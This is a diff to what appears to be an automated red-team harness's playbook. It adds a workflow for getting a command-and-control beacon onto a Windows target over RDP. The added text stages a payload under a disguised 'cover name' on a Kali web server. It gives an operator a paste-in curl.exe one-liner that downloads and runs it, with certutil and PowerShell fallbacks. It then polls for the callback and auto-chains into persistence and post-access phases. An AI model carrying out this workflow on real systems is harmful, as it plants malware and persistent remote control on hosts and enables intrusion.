@@ -143,6 +143,75 @@ access_probe:
 use that method first regardless of probe order. Still probe all methods and
 record results.
 
+## RDP Beacon Delivery Workflow
+
+Triggered when access probe determines RDP is the only available method
+(or operator selects RDP explicitly). This is an operator-assisted workflow —
+harness stages everything, operator pastes one command.
+
+### Step 1: Stage Payload on Kali HTTP Server
+
+```
+1. Generate payload: tuoni_payload_create (cover name per RT-SIG-003)
+2. Verify Tuoni file server active on port 8080:
+   tuoni_listeners_list → confirm HTTP file server listener
+3. If no file server: start python3 HTTP server on Kali as fallback:
+   ssh kali 'cd /tmp/payloads && python3 -m http.server 8080 &'
+4. Verify payload accessible:
+   ssh kali 'curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/files/<payload>'
+   Expected: 200
+```
+
+### Step 2: Generate One-Liner for Operator
+
+Using curl.exe template from Delivery Templates section:
+
+```
+Operator instruction:
+  1. In RDP session, open cmd.exe (Win+R → cmd)
+  2. Paste and run:
+
+     curl.exe http://<KALI_IP>:8080/files/<PAYLOAD> -o %TEMP%\<COVER_NAME>.exe && %TEMP%\<COVER_NAME>.exe
+
+  3. Close cmd window after execution
+```
+
+Print this to operator with concrete values filled in. Include:
+- Kali IP (from engagement config or `ssh kali 'hostname -I'`)
+- Payload filename (from step 1)
+- Cover name (from RT-SIG-003)
+- Fallback commands (certutil, PowerShell) if curl.exe fails
+
+### Step 3: Monitor for Beacon Callback
+
+After giving operator the command, poll for new agent:
+
+```
+1. Record current agent list: tuoni_agents_list → baseline_agents
+2. Notify operator: "Paste the command now. Monitoring for callback..."
+3. Poll tuoni_agents_list every 15 seconds for up to 5 minutes
+4. New agent = agent not in baseline_agents, matching target IP
+5. On callback detected:
+   - Confirm agent alive: tuoni_agent_command (whoami)
+   - Record agent ID in Obsidian target page § Access
+   - Print: "Beacon live — agent <ID> on <hostname>. Switching to harness mode."
+   - Auto-chain: invoke persist-swarm (Phase 3 step 4)
+```
+
+**If no callback after 5 minutes:**
+1. Check: did operator paste the command? (ask)
+2. Check: is target DNS/routing correct? (`tuoni_agents_list` from foothold)
+3. Check: is firewall blocking outbound from target to Kali?
+4. Suggest: try HTTPS template, try certutil fallback, try PowerShell fallback
+5. If still no callback: escalate to operator for manual troubleshooting
+
+### Step 4: Handoff to Harness
+
+On beacon callback, execution model switches immediately:
+- Operator steps back from RDP
+- Harness takes over via Tuoni agent
+- Continue with Phase 3 step 4 (persist-swarm) and Phase 4 (post-access)
+
 ## Phases
 
 ### Phase 0: Tool Availability Check
